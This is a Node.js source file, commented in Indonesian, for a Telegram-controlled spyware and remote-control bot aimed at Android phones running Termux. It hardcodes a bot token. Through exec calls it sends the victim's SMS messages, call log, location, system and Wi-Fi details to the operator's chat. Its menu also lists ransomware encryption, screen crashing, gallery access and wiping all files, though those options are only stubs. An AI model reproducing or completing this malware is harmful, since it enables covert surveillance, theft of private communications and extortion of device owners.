const fetch = require('node-fetch');
const TelegramBot = require('telegram-bot-api');

const api = new TelegramBot({
    token: '7132826358:AAGCLoI7JYHA3nFYwEE8seu-qTmjwxEONL0',
    updates: {
        enabled: true,
    }
});

// Fungsi untuk mengirim pesan
async function sendMessage(chatId, text) {
    await fetch(`https://api.telegram.org/bot${api.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: text }),
    });
}

// Fungsi untuk mengirim foto
async function sendPhoto(chatId, photoPath) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', require('fs').createReadStream(photoPath));

    await fetch(`https://api.telegram.org/bot${api.token}/sendPhoto`, {
        method: 'POST',
        body: formData,
    });
}

// Fungsi untuk membuat keyboard khusus
function createKeyboard() {
    return {
        keyboard: [
            ['Cek Status Baterai', 'Lokasi'],
            ['Informasi Sistem', 'Dump SMS', 'Dump Panggilan'],
            ['Ubah Wallpaper', 'Pesan Teks Audio Ke Target'],
            ['Mati/Hidup Wifi', 'Dapatkan Informasi Wifi'],
            ['Senter On/Off', 'Getar Devices'],
            ['Spam Notifikasi No Limit', 'Ambil List Kotak Target'],
            ['Play Audio', 'Spam File No Limit'],
            ['Encrypt Ransom', 'Decrypt Ransom'],
            ['Layar Crash', 'Galery Eyes'],
            ['Remove All File']
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    };
}

// Fungsi untuk menangani perintah
api.on('message', async (message) => {
    const chatId = message.chat.id;
    const command = message.text;

    switch (command) {
        case 'Cek Status Baterai':
            const batteryStatus = await getTermuxData('termux-battery-status');
            sendMessage(chatId, `Status Baterai: ${batteryStatus}`);
            break;
        case 'Lokasi':
            const location = await getTermuxData('termux-location');
            sendMessage(chatId, `Lokasi: ${location}`);
            break;
        case 'Informasi Sistem':
            const systemInfo = await getTermuxData('termux-info');
            sendMessage(chatId, `Informasi Sistem: ${systemInfo}`);
            break;
        case 'Dump SMS':
            const smsList = await getTermuxData('termux-sms-list');
            sendMessage(chatId, `Daftar SMS: ${smsList}`);
            break;
        case 'Dump Panggilan':
            const callLog = await getTermuxData('termux-call-log');
            sendMessage(chatId, `Log Panggilan: ${callLog}`);
            break;
        case 'Ubah Wallpaper':
            sendMessage(chatId, 'Masukkan URL wallpaper yang ingin digunakan:');
            // Menunggu input URL wallpaper
            break;
        case 'Pesan Teks Audio Ke Target':
            sendMessage(chatId, 'Masukkan teks yang ingin diubah menjadi audio:');
            // Menunggu input teks
            break;
        case 'Mati/Hidup Wifi':
            sendMessage(chatId, 'Mengaktifkan atau mematikan Wi-Fi...');
            // Implementasikan pengaturan Wi-Fi
            break;
        case 'Dapatkan Informasi Wifi':
            const wifiInfo = await getTermuxData('termux-wifi-connectioninfo');
            sendMessage(chatId, `Informasi Wi-Fi: ${wifiInfo}`);
            break;
        case 'Senter On/Off':
          sendMessage(chatId, 'Mengaktifkan atau mematikan senter...');
            // Implementasikan pengaturan senter
            break;
        case 'Getar Devices':
            sendMessage(chatId, 'Menggetarkan perangkat...');
            // Implementasikan getaran
            break;
        case 'Spam Notifikasi No Limit':
            sendMessage(chatId, 'Masukkan judul notifikasi:');
            // Menunggu input judul notifikasi
            break;
        case 'Ambil List Kotak Target':
            sendMessage(chatId, 'Mengambil daftar kotak target...');
            // Implementasikan pengambilan daftar
            break;
        case 'Play Audio':
            sendMessage(chatId, 'Memutar audio...');
            // Implementasikan pemutaran audio
            break;
        case 'Spam File No Limit':
            sendMessage(chatId, 'Mengirim spam file...');
            // Implementasikan pengiriman spam file
            break;
        case 'Encrypt Ransom':
            sendMessage(chatId, 'Masukkan password untuk enkripsi:');
            // Menunggu input password
            break;
        case 'Decrypt Ransom':
            sendMessage(chatId, 'Masukkan password untuk dekripsi:');
            // Menunggu input password
            break;
        case 'Layar Crash':
            sendMessage(chatId, 'Membuat layar crash...');
            // Implementasikan layar crash
            break;
        case 'Galery Eyes':
            sendMessage(chatId, 'Mengakses galeri...');
            // Implementasikan akses galeri
            break;
        case 'Remove All File':
            sendMessage(chatId, 'Menghapus semua file...');
            // Implementasikan penghapusan file
            break;
        default:
            sendMessage(chatId, 'Perintah tidak dikenal. Silakan coba lagi.');
            break;
    }
});

// Fungsi untuk mendapatkan data dari Termux API
function getTermuxData(command) {
    return new Promise((resolve, reject) => {
        const { exec } = require('child_process');
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(stderr);
            } else {
                resolve(stdout);
            }
        });
    });
}

// Fungsi untuk menjalankan bot
api.start();
